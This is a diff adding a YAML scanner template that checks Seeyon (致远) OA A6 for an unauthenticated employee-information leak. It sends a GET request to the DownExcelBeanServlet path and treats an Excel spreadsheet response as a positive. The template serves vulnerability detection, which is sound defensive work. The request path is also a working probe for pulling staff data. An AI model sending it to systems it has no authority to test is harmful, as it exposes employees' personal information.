@@ -1,0 +1,11 @@
+name: 致远OA-a6-employee-info-leak
+description: >-
+  信息泄露
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
+    expression:
+      status: 200
+      body_all: ["Excel.Sheet"]
